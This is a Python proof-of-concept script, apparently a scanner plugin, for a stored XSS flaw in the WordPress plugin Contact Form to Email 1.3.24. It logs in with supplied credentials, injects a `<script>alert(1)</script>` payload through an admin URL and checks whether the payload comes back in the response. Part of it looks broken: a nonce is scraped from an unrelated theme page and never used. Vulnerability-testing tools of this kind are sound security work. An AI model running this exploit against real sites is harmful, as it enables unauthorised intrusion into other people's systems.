# coding: utf-8
import requests
import random

#WordPress Plugin Contact Form to Email 1.3.24 - Stored Cross Site Scripting (XSS)
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    # Authentication:
    session = requests.Session()
    auth_url=url+'/wp-login.php'
    redirecto = url + "/wp-admin/"
    username=logindict.keys()
    password=logindict.values()
    header = {'User-Agent': user_agent}
    data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': redirecto, 'testcookie': '1'}
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        auth  = session.post(auth_url, headers=header, data=data, proxies=proxies, timeout=5)
    else:
        auth  = session.post(auth_url, headers=header, data=data, timeout=5)

    #漏洞位置
    exploit_url=url+'/wp-admin/admin.php?page=cp_contactformtoemail&rsave=19518d5026&a=1&r=0.06296520785515913&name=<script>alert(1)<%2Fscript>'
    verification_url=url+"/wp-admin/admin.php?page=cp_contactformtoemail&pwizard=1&cal=4&r=0.8630795030649687"
    # Get Security nonce value:
    check = session.get(url+ '/wp-admin/themes.php?page=catch-themes-demo-import').text
    nonce = check[check.find('ajax_nonce"') + 13:]
    wp_nonce = nonce[:nonce.find('"')]

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = session.get(exploit_url, headers=header, proxies=proxies)
        response = session.get(verification_url, headers=header, proxies=proxies)
    else:
        response = session.get(exploit_url, headers=header)
        response = session.get(verification_url, headers=header)
    # with open('../../data/b.html','wb') as f:
    #     f.write(response.content)

    if response.status_code==200:
        if "<script>alert(1)</script>" in response.text:
            return 'WordPress Plugin Contact Form to Email 1.3.24 - 存储型XSS'


def run(url,logindict,user_agent,proxies):
    if logindict:
        result = poc(url,logindict,user_agent,proxies)
        return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','')

